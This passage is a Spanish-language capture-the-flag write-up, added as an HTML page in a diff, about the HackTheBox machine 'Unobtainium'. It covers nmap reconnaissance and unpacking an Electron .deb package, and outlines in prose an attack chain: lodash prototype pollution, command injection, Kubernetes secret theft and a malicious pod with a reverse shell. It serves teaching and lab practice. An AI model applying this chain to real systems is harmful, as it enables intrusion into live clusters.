@@ -1,0 +1,2660 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/lanz2.png">
+
+<title>HackTheBox - Unobtainium</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Unobtainium | Sh0x blog</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="HackTheBox - Unobtainium" />
+<meta name="author" content="lanz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Máquina Linux nivel difícil. Explotaremos una app de Linux. Jugando con librerías de JavaScript, la infectaremos (Prototype Pollution en lodash) y haremos command-injection (en google-cloudstorage-commands). Y moveremos internamente muchas cosas con Kubernetes." />
+<meta property="og:description" content="Máquina Linux nivel difícil. Explotaremos una app de Linux. Jugando con librerías de JavaScript, la infectaremos (Prototype Pollution en lodash) y haremos command-injection (en google-cloudstorage-commands). Y moveremos internamente muchas cosas con Kubernetes." />
+<link rel="canonical" href="http://localhost:4000/htb/unobtainium" />
+<meta property="og:url" content="http://localhost:4000/htb/unobtainium" />
+<meta property="og:site_name" content="Sh0x blog" />
+<meta property="og:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338banner.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-08-30T00:00:00-07:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338banner.png" />
+<meta property="twitter:title" content="HackTheBox - Unobtainium" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lanz"},"dateModified":"2021-08-30T00:00:00-07:00","datePublished":"2021-08-30T00:00:00-07:00","description":"Máquina Linux nivel difícil. Explotaremos una app de Linux. Jugando con librerías de JavaScript, la infectaremos (Prototype Pollution en lodash) y haremos command-injection (en google-cloudstorage-commands). Y moveremos internamente muchas cosas con Kubernetes.","headline":"HackTheBox - Unobtainium","image":"https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/htb/unobtainium"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/sh0x.png"},"name":"lanz"},"url":"http://localhost:4000/htb/unobtainium"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>El tiempo a destiempo</h3>
+        <li><a href="/" style="color: #0ecbe4;">Home</a></li>
+        <li><a href="/categories#article">Artículos</a></li>
+        <li><a href="/categories#htb">HackTheBox</a></li>
+        <li><a href="/about" style="color: rgb(89, 89, 89);">Whoami</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Escribe y enter :P"/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/sh0x.png" alt="Sh0x blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">HackTheBox - Unobtainium</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+            
+        </div>            
+        <div>
+        Funk <a targ="_blank" class="text-info">Sh0x</a> el 
+        <span class="post-date"><time class="post-date" datetime="2021-08-30">30 Aug 2021</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338banner.png" alt="HackTheBox - Unobtainium">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Máquina Linux nivel difícil. Explotaremos una app de Linux. Jugando con librerías de <code>JavaScript</code>, la infectaremos (<strong>Prototype Pollution</strong> en <code>lodash</code>)  y haremos <strong>command-injection</strong> (en <code>google-cloudstorage-commands</code>). Y moveremos internamente muchas cosas con <code>Kubernetes</code>.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338unobtainiumHTB.png" alt="338unobtainiumHTB" /></p>
+
+<h3 id="tldr-spanish-writeup">TL;DR (Spanish writeup)</h3>
+
+<p><strong>Creada por</strong>: <a href="https://www.hackthebox.eu/profile/27390">felamos</a>.</p>
+
+<p>Bueeeeno, nos encontraremos con un servidor web el cual nos entregara en las manitas un paquete <code>.deb</code>, antes de instalarlo en el sistema jugaremos con algunas herramientas para ver el contenido de ese paquete, Instalaremos el paquete <strong>.deb</strong> y obtendremos el binario <strong>unobtainium</strong> en el sistema. La aplicación permite enviar mensajes en forma de “chat” y podremos verlos reflejados ya sea en la web o en la propia app.</p>
+
+<p>Jugaremos y jugaremos para encontrar algunos errores, esos errores hablarán por si solos (y nos apoyaremos de los archivos encontrados en el paquete para darle más fuerza a nuestra búsqueda), lograremos leer archivos de la app usando un apartado llamado <code>/todo</code>. Entre eso obtendremos el código fuente de la aplicación.</p>
+
+<p>Inspeccionándolo encontraremos varias brechas en dos librerías de <code>JavaScript</code>, un envenenamiento de prototipos (<strong>Prototype Pollution</strong>) en la librería <code>lodash</code> y otra <strong>inyectando comandos</strong> sobre <code>google-cloudstorage-commands</code>. Jugando con ellas lograremos <strong>ejecución remota de comandos</strong> sobre el contenedor que sirve el app.</p>
+
+<p>Con <strong>Python</strong> creamos este script to lindo, ya sea para obtener una Shell desde él o para ejecutar comandos en el contenedor.</p>
+
+<ul>
+  <li><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/unobtainium/pollutionRCE.py">pollutionRCE.py</a></li>
+</ul>
+
+<p>Estando dentro del contenedor encontraremos que con lo único que podemos jugar es con <code>Kubernetes</code>, moveremos y moveremos (y seguiremos moviendo) cosas para volver a realizar el ataque de <strong>Prototype Pollution + Command Injection</strong> peeeeero ahora sobre el entorno de desarrollo que esta internamente corriendo (antes lo hicimos en el de <strong>producción</strong> :P)</p>
+
+<p>Ya dentro, veremos que podemos listar “secretos” (claves, contraseñas, texto privado, tokens, etc.) de <code>Kubernetes</code> (algo que antes no). Uno de esos secretos contiene el token del <code>admin</code> de <strong>Kubernetes</strong>, con él tendremos control total contra el servicio (de nuevo) <strong>Kubernetes</strong>.</p>
+
+<p>Lo que nos dará la opción de crearnos un <strong>pod</strong> (“conjunto de contenedores”) malicioso que copie toooooda la raíz del sistema en una carpeta de ese <strong>pod</strong> (a la vez que ejecuta una <strong>Reverse Shell</strong>), así tendremos acceso a todos los archivos.</p>
+
+<p>YA FIN 🧎</p>
+
+<p>…</p>
+
+<h3 id="clasificación-de-la-máquina-según-la-gentesita">Clasificación de la máquina según la gentesita</h3>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 80%;" /></p>
+
+<p>Mucha enumeración, algunas vulns conocidas, pero sobre todo bastante llevada a la realidad, me gusta.</p>
+
+<blockquote>
+  <p>Escribo para tener mis “notas”, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo plasmar lo que hice.</p>
+</blockquote>
+
+<p>…</p>
+
+<p>SHS 25.</p>
+
+<ol>
+  <li><a href="#reconocimiento">Reconocimiento</a>.
+    <ul>
+      <li><a href="#enum-nmap">Enumeración de puertos con nmap</a>.</li>
+    </ul>
+  </li>
+  <li><a href="#enumeracion">Enumeración</a>.
+    <ul>
+      <li><a href="#puerto-80">Descubrimos que hay en el servidor web del puerto 80</a>.</li>
+      <li><a href="#enum-deb-withar">Descargamos un paquete <strong>.deb</strong> alojado en la web y lo desbaratamos</a>.</li>
+    </ul>
+  </li>
+  <li><a href="#explotacion">Explotación</a>.
+    <ul>
+      <li><a href="#found-indexjs">Encontramos el código fuente de la <strong>API</strong> con ayuda de <strong>BurpSuite</strong></a>.</li>
+      <li><a href="#prototype-pollution">Contaminamos prototipos para asignar objeto <strong>canUpdate</strong></a>.</li>
+      <li><a href="#prototype-pollution-rce">RCE - <strong>Prototype Pollution (<u>lodash.merge</u>) &amp; Command Injection (<u>google-cloudstorage</u>)</strong></a>.</li>
+    </ul>
+  </li>
+  <li><a href="#lateral-webapp-devnode">Movimiento lateral : docker-webapp -&gt; docker-devnode</a>.
+    <ul>
+      <li><a href="#expl-webapp-api-kubectl">Jugando con la API** y <strong>kubectl</strong> contra <strong>Kubernetes</strong></a>.</li>
+      <li><a href="#expl-webapp-bash-pollution">RCE interno: <strong>Pollution + Command Injection</strong></a>.</li>
+    </ul>
+  </li>
+  <li><a href="#escalada-de-privilegios">Escalada de privilegios</a>.
+    <ul>
+      <li><a href="#lateral-tokenadmin-found">Encontramos “secreto” del <strong>admin</strong> y obtenemos interacción total con <strong>Kubernetes</strong></a>.</li>
+      <li><a href="#malicious-pod">Generamos <strong>pod</strong> malicioso</a>.</li>
+    </ul>
+  </li>
+</ol>
+
+<p>…</p>
+
+<h1 id="reconocimiento">Reconocimiento <a href="#reconocimiento">#</a></h1>
+
+<p>…</p>
+
+<h2 id="enum-nmap">Enumeración de puertos con nmap <a href="#enum-nmap">📌</a></h2>
+
+<p>Lo primero será encontrar que puertos están abiertos en la máquina, lo haremos apoyados de <code>nmap</code>:</p>
+
+<pre><code class="language-bash">❱ nmap -p- --open -v 10.10.10.235 -oG initScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p-</td>
+      <td style="text-align: left">Escanea todos los 65535</td>
+    </tr>
+    <tr>
+      <td>–open</td>
+      <td style="text-align: left">Solo los puertos que están abiertos</td>
+    </tr>
+    <tr>
+      <td>-v</td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando</td>
+    </tr>
+    <tr>
+      <td>-oG</td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para usar una <a href="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png">función <strong>extractPorts</strong></a> de <a href="https://s4vitar.github.io/">S4vitar</a> que me extrae los puertos en la clipboard</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Este escaneo nos muestra:</p>
+
+<pre><code class="language-bash">❱ cat initScan
+# Nmap 7.80 scan initiated Wed Jun 30 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.235
+# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+Host: 10.10.10.235 ()	Status: Up
+Host: 10.10.10.235 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 2379/open/tcp//etcd-client///, 2380/open/tcp//etcd-server///, 8443/open/tcp//https-alt///, 10250/open/tcp/////, 10256/open/tcp/////, 31337/open/tcp//Elite///
+# Nmap done at Wed Jun 30 25:25:25 2021 -- 1 IP address (1 host up) scanned in 92.68 seconds
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>22</td>
+      <td style="text-align: left"><strong><a href="https://www.hackingarticles.in/ssh-penetration-testing-port-22/">SSH</a></strong>: Posibilidad de obtener una Shell de manera segura.</td>
+    </tr>
+    <tr>
+      <td>80</td>
+      <td style="text-align: left"><strong><a href="https://searchnetworking.techtarget.com/definition/port-80">HTTP</a></strong>: Servidor web.</td>
+    </tr>
+    <tr>
+      <td>2379</td>
+      <td style="text-align: left"><strong><a href="https://www.redhat.com/es/topics/containers/what-is-etcd">etcd</a></strong>: Almacén de datos de <strong>Kubernetes</strong>.</td>
+    </tr>
+    <tr>
+      <td>2380</td>
+      <td style="text-align: left"><strong><a href="https://etcd.io/">etcd</a></strong>: Almacén de datos de <strong>Kubernetes</strong>.</td>
+    </tr>
+    <tr>
+      <td>8443</td>
+      <td style="text-align: left"><strong><a href="https://www.digicert.com/es/what-is-ssl-tls-https/">HTTPS</a></strong>: Servidor web con certificado que lo hace más “seguro”.</td>
+    </tr>
+    <tr>
+      <td>10250</td>
+      <td style="text-align: left">No lo sabemos aún</td>
+    </tr>
+    <tr>
+      <td>10256</td>
+      <td style="text-align: left">No lo sabemos tampoco :P</td>
+    </tr>
+    <tr>
+      <td>31337</td>
+      <td style="text-align: left">En <a href="https://www.speedguide.net/port.php?port=31337">internet dicen</a> que se usa para almacenar backdoors, pero pues no estamos seguros de que contiene aún.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Teniendo los puertos, vamos a escanear ahora en búsqueda de versiones y scripts relacionados con esos servicios:</p>
+
+<p><strong>~(Usando la función <code>extractPorts</code> (referenciada antes) podemos copiar rápidamente los puertos en la clipboard, así no tenemos que ir uno a uno</strong></p>
+
+<pre><code class="language-bash">❱ extractPorts initScan 
+[*] Extracting information...
+
+    [*] IP Address: 10.10.10.235
+    [*] Open ports: 22,80,2379,2380,8443,10250,10256,31337
+
+[*] Ports copied to clipboard
+</code></pre>
+
+<p><strong>)~</strong></p>
+
+<pre><code class="language-bash">❱ nmap -p 22,80,2379,2380,8443,10250,10256,31337 -sC -sV 10.10.10.235 -oN portScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p</td>
+      <td style="text-align: left">Escaneo de los puertos obtenidos</td>
+    </tr>
+    <tr>
+      <td>-sC</td>
+      <td style="text-align: left">Muestra todos los scripts relacionados con el servicio</td>
+    </tr>
+    <tr>
+      <td>-sV</td>
+      <td style="text-align: left">Nos permite ver la versión del servicio</td>
+    </tr>
+    <tr>
+      <td>-oN</td>
+      <td style="text-align: left">Guarda el output en un archivo</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Obtenemos:</p>
+
+<pre><code class="language-bash">❱ cat portScan
+# Nmap 7.80 scan initiated Wed Jun 30 25:25:25 2021 as: nmap -p 22,80,2379,2380,8443,10250,10256,31337 -sC -sV -oN portScan 10.10.10.235
+Nmap scan report for 10.10.10.235
+Host is up (0.11s latency).
+
+PORT      STATE SERVICE          VERSION
+22/tcp    open  ssh              OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+80/tcp    open  http             Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Unobtainium
+2379/tcp  open  ssl/etcd-client?
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  h2
+| tls-nextprotoneg: 
+|_  h2
+2380/tcp  open  ssl/etcd-server?
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  h2
+| tls-nextprotoneg: 
+|_  h2
+8443/tcp  open  ssl/https-alt
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.0 403 Forbidden
+|     Cache-Control: no-cache, private
+|     Content-Type: application/json
+|     X-Content-Type-Options: nosniff
+|     X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39
+|     X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd
+|     Date: Wed, 30 Jun 2021 17:06:18 GMT
+|     Content-Length: 212
+|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/nice ports,/Trinity.txt.bak"","reason":"Forbidden","details":{},"code":403}
+|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   HTTPOptions: 
+|     HTTP/1.0 403 Forbidden
+|     Cache-Control: no-cache, private
+|     Content-Type: application/json
+|     X-Content-Type-Options: nosniff
+|     X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39
+|     X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd
+|     Date: Wed, 30 Jun 2021 17:06:17 GMT
+|     Content-Length: 189
+|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
+|_http-title: Site doesn't have a title (application/json).
+| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
+| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.10.235, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
+| Not valid before: 2021-06-29T16:59:25
+|_Not valid after:  2022-06-30T16:59:25
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|   h2
+|_  http/1.1
+10250/tcp open  ssl/http         Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
+| ssl-cert: Subject: commonName=unobtainium@1610865428
+| Subject Alternative Name: DNS:unobtainium
+| Not valid before: 2021-01-17T05:37:08
+|_Not valid after:  2022-01-17T05:37:08
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|   h2
+|_  http/1.1
+10256/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
+31337/tcp open  http             Node.js Express framework
+| http-methods: 
+|_  Potentially risky methods: PUT DELETE
+|_http-title: Site doesn't have a title (application/json; charset=utf-8).
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8443-TCP:V=7.80%T=SSL%I=7%D=6/30%Time=60DCA3A3%P=x86_64-pc-linux-gn
+SF:u%r(HTTPOptions,203,"HTTP/1....................................20Reques
+...
+# cositas que no nos sirven
+...
+SF:t");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed Jun 30 25:25:25 2021 -- 1 IP address (1 host up) scanned in 234.27 seconds
+</code></pre>
+
+<p>Podemos destacar algunas cosas:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Puerto</th>
+      <th style="text-align: left">Servicio</th>
+      <th style="text-align: left">Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">22</td>
+      <td style="text-align: left">SSH</td>
+      <td style="text-align: left">OpenSSH 8.2p1 Ubuntu 4ubuntu0.2</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">80</td>
+      <td style="text-align: left">HTTP</td>
+      <td style="text-align: left">Apache httpd 2.4.41</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">2379</td>
+      <td style="text-align: left">HTTPS</td>
+      <td style="text-align: left">No esta seguro, pero vamos a quedarnos con ese resultado: etcd-client</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">2380</td>
+      <td style="text-align: left">HTTPS</td>
+      <td style="text-align: left">Igual, vamos a quedarnos con ese resultado: etcd-server</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">8443</td>
+      <td style="text-align: left">HTTPS</td>
+      <td style="text-align: left">No nos muestra</td>
+    </tr>
+  </tbody>
+</table>
+
+<ul>
+  <li>Un formato <code>json</code> algo interesante:</li>
+</ul>
+
+<pre><code class="language-json">{
+  ...
+  "message":"forbidden: User "system:anonymous" cannot get path "/nice ports,/Trinity.txt.bak"",
+  ...
+}
+</code></pre>
+
+<ul>
+  <li>Vemos un archivo que quizás sea relevante como pueda que no, guardémoslo: <code>/Trinity.txt.bak</code>.</li>
+  <li>Un dominio <code>control-plane.minikube.internal</code>, realmente varios, pero este me llama la atención.</li>
+</ul>
+
+<hr />
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Puerto</th>
+      <th style="text-align: left">Servicio</th>
+      <th style="text-align: left">Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">10250</td>
+      <td style="text-align: left">HTTPS</td>
+      <td style="text-align: left">Golang net/http server (Go-IPFS json-rpc or InfluxDB API)</td>
+    </tr>
+  </tbody>
+</table>
+
+<ul>
+  <li>Un nombre de servidor algo extraño: <code>unobtainium@1610865428</code>.</li>
+</ul>
+
+<hr />
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Puerto</th>
+      <th style="text-align: left">Servicio</th>
+      <th style="text-align: left">Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">10256</td>
+      <td style="text-align: left">HTTP</td>
+      <td style="text-align: left">Golang net/http server (Go-IPFS json-rpc or InfluxDB API)</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">31337</td>
+      <td style="text-align: left">HTTPS</td>
+      <td style="text-align: left">Node.js Express framework</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Opa, bastantes cositas, pues empecemos a jugar con cada uno a ver por donde le damos duro a esta máquina.</p>
+
+<p>…</p>
+
+<h1 id="enumeracion">Enumeración <a href="#enumeracion">#</a></h1>
+
+<p>…</p>
+
+<h2 id="puerto-80">Puerto 80 <a href="#puerto-80">📌</a></h2>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338page80.png" alt="338page80" /></p>
+
+<p>Una web sencilla describiéndonos una aplicación para chatear… Vemos 4 botones, los 4 contienen redirects:</p>
+
+<pre><code class="language-bash">- Unobtainium nos lleva a http://10.10.10.235/downloads/checksums.txt
+- Download deb a http://10.10.10.235/downloads/unobtainium_debian.zip
+- Download rpm a http://10.10.10.235/downloads/unobtainium_redhat.zip
+- Download snap a http://10.10.10.235/downloads/unobtainium_snap.zip
+</code></pre>
+
+<p>Si vamos al link de <strong>Unobtainium</strong> encontramos los hashes correspondientes a cada binario subido (que supongo estarán dentro de los <code>.zip</code>), estos hashes nos <strong>sirven para comprobar que lo que descarguemos no ha sido modificado en el proceso</strong>.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338page80_checksums.png" alt="338page80_checksums" /></p>
+
+<h3 id="jugando-con-unobtainium_debianzip">Jugando con unobtainium_debian.zip</h3>
+
+<p>¿Por qué el de Debian? Bueno, estoy en <strong>ParrotOS</strong> y es un sistema operativo basado en <strong>Debian</strong> y <code>deb</code> hace referencia a los paquetes de software para <u>Deb</u>ian.</p>
+
+<p>Lo descargamos en la máquina, lo descomprimimos y obtenemos:</p>
+
+<pre><code class="language-bash">❱ ls 
+unobtainium_1.0.0_amd64.deb  unobtainium_1.0.0_amd64.deb.md5sum
+</code></pre>
+
+<p>Hacemos la comprobacion de hashes:</p>
+
+<pre><code class="language-bash">❱ curl -s http://10.10.10.235/downloads/checksums.txt | grep deb
+c9fe8a2bbc66290405803c3d4a37cf28  unobtainium_1.0.0_amd64.deb
+❱ md5sum unobtainium_1.0.0_amd64.deb
+c9fe8a2bbc66290405803c3d4a37cf28  unobtainium_1.0.0_amd64.deb
+</code></pre>
+
+<p>Listo, todo perfecto con el paquete, es el original.</p>
+
+<hr />
+
+<h2 id="enum-deb-withar">Abrimos el paquete <u>.deb</u> <a href="#enum-deb-withar">📌</a></h2>
+
+<p>Algo que encontré bastante interesante fue que <a href="https://www.cyberciti.biz/faq/how-to-extract-a-deb-file-without-opening-it-on-debian-or-ubuntu-linux/">los paquetes <strong><u>.deb</u></strong> traen consigo 3 archivos</a> que son los que contienen lo que se va a instalar en el sistema:</p>
+
+<ul>
+  <li><code>debian-binary</code> que contiene la versión del paquete <code>.deb</code>.</li>
+  <li><code>control.tar.gz</code> que tiene algunos hashes y los controles para la construcción del paquete.</li>
+  <li>Y <code>data.tar.gz</code> que contiene todos los archivos a ser instalados.</li>
+</ul>
+
+<p>Para verlos, podemos jugar con la herramienta <a href="https://www.geeksforgeeks.org/ar-command-in-linux-with-examples/">ar</a> y su parámetro <code>t</code>:</p>
+
+<pre><code class="language-bash">❱ ar t unobtainium_1.0.0_amd64.deb 
+debian-binary
+control.tar.gz
+data.tar.xz
+</code></pre>
+
+<p>Y para extraerlos del paquete usamos el parámetro <code>x</code>:</p>
+
+<pre><code class="language-bash">❱ ar x unobtainium_1.0.0_amd64.deb
+❱ ls
+control.tar.gz  data.tar.xz  debian-binary  unobtainium_1.0.0_amd64.deb
+</code></pre>
+
+<p>Bien, ahora para extraer el contenido de esos comprimidos jugamos con <code>tar</code>:</p>
+
+<p>🔦 <strong><u>control</u></strong>:</p>
+
+<pre><code class="language-bash">❱ tar xvf control.tar.gz 
+./
+./postinst
+./postrm
+./control
+./md5sums
+</code></pre>
+
+<p>🔦 <strong><u>data</u></strong>:</p>
+
+<pre><code class="language-bash">❱ tar xvf data.tar.xz
+./
+./usr/
+./usr/share/
+...
+...
+...
+./opt/unobtainium/LICENSES.chromium.html
+./opt/unobtainium/libvk_swiftshader.so
+</code></pre>
+
+<p>Bien, enumerando los dos encontramos algunas cosas muy lindas…</p>
+
+<hr />
+
+<h3 id="inside-data-tar-gz">Exploramos el contenido de <u>data.tar.gz</u> <a href="#inside-data-tar-gz">🧷</a></h3>
+
+<p>Nos extrae dos carpetas, <code>/usr</code> (que tiene el icono del programa y cosas de cara al usuario) y <code>/opt</code> (que tiene todos los archivos necesarios para instalar el binario y su correcto funcionamiento)…</p>
+
+<p>Basándome en una máquina que hicimos que usaba <strong>Electron</strong> recordé que existe un archivo <code>.asar</code> el cual contiene todos los fuentes y código con el que fue creado algún proyecto.</p>
+
+<p>Pues buscandoooo lo encontramos en <code>/opt/unobtainium/resources</code> (: Ya con ese archivo podemos aprovechar el uso de un módulo de <strong>node</strong> para obtener el código fuente de la aplicación, en este caso del binario <strong>unobtainium</strong>.</p>
+
+<ul>
+  <li><a href="https://medium.com/how-to-electron/how-to-get-source-code-of-any-electron-application-cbb5c7726c37">How to get the source code of any electron application</a>.</li>
+</ul>
+
+<p>Siguiendo los pasos de ese recurso logramos extraer varios archivos:</p>
+
+<pre><code class="language-bash">❱ mkdir files_unobtainium
+❱ asar extract app.asar files_unobtainium/
+</code></pre>
+
+<pre><code class="language-bash">❱ cd files_unobtainium/
+❱ ls
+index.js  package.json  src
+</code></pre>
+
+<p>Viendo el archivo <code>package.json</code> obtenemos un posible usuario, vemos un dominio y un email:</p>
+
+<pre><code class="language-json">❱ cat package.json
+{
+  "name": "unobtainium",
+  "version": "1.0.0",
+  "description": "client",
+  "main": "index.js",
+  "homepage": "http://unobtainium.htb",
+  "author": "felamos &lt;felamos@unobtainium.htb&gt;",
+  "license": "ISC"
+}
+</code></pre>
+
+<p>En la carpeta <code>src/</code> están todos los archivos usados por la aplicación:</p>
+
+<pre><code class="language-bash">❱ tree src/
+src/
+├── css
+│   ├── bootstrap.min.css
+│   └── dashboard.css
+├── get.html
+├── index.html
+├── js
+│   ├── app.js
+│   ├── bootstrap.bundle.min.js
+│   ├── Chart.min.js
+│   ├── check.js
+│   ├── dashboard.js
+│   ├── feather.min.js
+│   ├── get.js
+│   ├── jquery.min.js
+│   └── todo.js
+├── post.html
+└── todo.html
+</code></pre>
+
+<p><strong>No vamos a repasar todos, pero si destacaremos cositas…</strong></p>
+
+<p>Por ejemplo el archivo <code>src/js/app.js</code> toma el valor de una variable llamada <code>message</code> y lo sube (método <strong>PUT</strong>) al servicio <code>http://unobtainium.htb:31337/</code>:</p>
+
+<pre><code class="language-js">$(document).ready(function(){
